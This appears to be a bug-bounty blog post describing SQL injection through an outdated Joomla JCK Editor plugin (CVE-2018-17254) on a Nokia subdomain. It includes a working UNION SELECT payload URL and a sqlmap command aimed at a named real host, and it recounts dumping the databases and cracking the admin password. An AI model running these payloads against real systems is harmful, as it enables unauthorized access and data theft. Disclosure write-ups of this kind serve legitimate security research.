---
title: "SQL Injection on Nokia subdomain"
date: 2019-11-04T17:55:28+08:00
description: "this blog is about SQL Injection on nokia subdomain"
tags: ["bugbounty","security","webpentesting"]
type: post
weight: 25
showTableOfContents: true
---
Greetings,

In this blog post, I will provide additional details regarding the SQL injection vulnerability identified on the Nokia subdomain, including the steps taken to exploit the vulnerability and gain access to the admin page.

After identifying the subdomain working with Joomla, I ran Joomscan to determine the version of the CMS and plugins installed. The scan revealed that the version of the JCK Editor plugin was outdated and vulnerable to SQL injection (CVE-2018-17254). This vulnerability could be exploited to execute arbitrary SQL commands and potentially gain unauthorized access to the system.

To exploit the vulnerability, I executed the following command:

```bash
Test = [HOST]/[PATH]/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=%22%20UNION%20SELECT%20NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL--%20aa
```

This command allowed me to retrieve the version of the database, as shown in the screenshot below.

![sql_nokia](https://1.bp.blogspot.com/-LgYxMfeJKhs/Xscwx2tKONI/AAAAAAAAEMs/HJ5I5jgXFv8ExESVK3bm0Mk2hpQWbDiagCK4BGAsYHg/nokiasql.png)

Subsequently, I used SQLMAP to automate the exploitation process. SQLMAP is a powerful tool designed to automate the detection and exploitation of SQL injection vulnerabilities. Using SQLMAP, I executed the following command:

```bash
$ sqlmap -u 'https://gdclive.nokia.com/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=' --level=5 --risk=3 --random-agent --technique=U -p parent --batch --current-DB --current-user
```

This command revealed the current user and the name of the database, as illustrated below.

![nokia_pwn](https://1.bp.blogspot.com/-87ctqF3EmDM/XscxFpvVAhI/AAAAAAAAENE/Cgi-Kfnjxco0cND_FONrVmsOWySdiu_SQCK4BGAsYHg/cp.jpg)

With this information, I was able to dump all the databases using the --all option and decrypt the password of the admin account, which enabled me to log into the admin panel.

In conclusion, the identification and exploitation of SQL injection vulnerabilities are critical steps in the process of identifying and addressing security weaknesses in web applications. It is essential to ensure that all plugins and software used in web development are up-to-date to minimize the risk of such vulnerabilities being exploited.

Thank you for reading.

Best regards.
